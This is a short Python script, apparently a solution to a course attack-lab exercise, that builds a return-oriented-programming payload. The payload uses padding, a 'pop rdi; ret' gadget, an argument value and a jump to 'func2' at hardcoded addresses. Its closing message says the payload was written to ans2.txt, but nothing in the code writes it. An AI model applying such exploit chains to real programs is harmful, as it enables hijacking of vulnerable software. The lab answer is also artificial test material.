import struct

# 1. Padding: 16 字节
padding = b'A' * 16

# 2. ROP Gadget: pop rdi; ret
pop_rdi_ret = 0x4012c7

# 3. rdi 参数值
arg_val = 0x3f8

# 4. 目标函数: func2
func2_addr = 0x401216

# 构造 Payload
payload = padding
payload += struct.pack("<Q", pop_rdi_ret) # 设置返回地址为 Gadget 地址
payload += struct.pack("<Q", arg_val)     # 放入 rdi 的值
payload += struct.pack("<Q", func2_addr)  # Gadget 返回后跳转到 func2
print("Payload written to ans2.txt")